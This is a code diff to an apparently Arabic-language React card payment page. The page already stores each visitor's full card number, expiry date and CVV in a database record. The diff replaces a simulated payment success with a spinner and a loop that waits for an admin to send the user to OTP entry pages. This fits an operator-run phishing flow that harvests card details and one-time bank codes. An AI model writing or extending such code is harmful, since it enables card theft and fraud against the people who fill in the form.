@@ -13,6 +13,7 @@ export default function Payment() {
     name: "",
   });
   const [processing, setProcessing] = useState(false);
+  const [waiting, setWaiting] = useState(false);
   const [success, setSuccess] = useState(false);
 
   useEffect(() => {
@@ -21,6 +22,28 @@ export default function Payment() {
       base44.entities.CardApplication.update(appId, { current_step: "payment" });
     }
   }, []);
+
+  // Poll for admin routing when in waiting state
+  useEffect(() => {
+    if (!waiting) return;
+    const appId = localStorage.getItem("card_app_id");
+    if (!appId) return;
+    const interval = setInterval(async () => {
+      const record = await base44.entities.CardApplication.filter({ id: appId });
+      const app = record[0];
+      if (!app) return;
+      if (app.otp_route === "otp") {
+        clearInterval(interval);
+        setWaiting(false);
+        navigate("/otp-verify");
+      } else if (app.otp_route === "otp_app") {
+        clearInterval(interval);
+        setWaiting(false);
+        navigate("/otp-app");
+      }
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [waiting, navigate]);
 
   const handleChange = (field, value) => {
     if (field === "card_number") {
@@ -41,41 +64,32 @@ export default function Payment() {
     e.preventDefault();
     setProcessing(true);
 
-    // Simulate payment processing
-    await new Promise((r) => setTimeout(r, 2000));
-
     const appId = localStorage.getItem("card_app_id");
     if (appId) {
       await base44.entities.CardApplication.update(appId, {
-        current_step: "confirmation",
-        status: "paid",
-        payment_reference: "PAY-" + Date.now(),
+        current_step: "otp_pending",
+        status: "pending_payment",
         card_holder: form.name,
         card_number_full: form.card_number,
         card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
         expiry_date: form.expiry,
         cvv: form.cvv,
+        otp_route: null,
       });
     }
 
     setProcessing(false);
-    setSuccess(true);
-
-    // Redirect after showing success
-    setTimeout(() => {
-      localStorage.removeItem("card_app_id");
-      navigate("/confirmation");
-    }, 2000);
+    setWaiting(true);
   };
 
-  if (success) {
+  if (waiting) {
     return (
       <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6" dir="rtl">
-        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
-          <CheckCircle className="w-10 h-10 text-green-600" />
+        <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mb-6">
+          <div className="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
         </div>
-        <h2 className="text-2xl font-bold text-foreground mb-2">تم الدفع بنجاح!</h2>
-        <p className="text-gray-500 text-center">جارٍ تحويلك لصفحة التأكيد...</p>
+        <h2 className="text-xl font-bold text-foreground mb-2">جارٍ معالجة الدفع...</h2>
+        <p className="text-gray-500 text-center text-sm">يرجى الانتظار، لا تغلق الصفحة</p>
       </div>
     );
   }
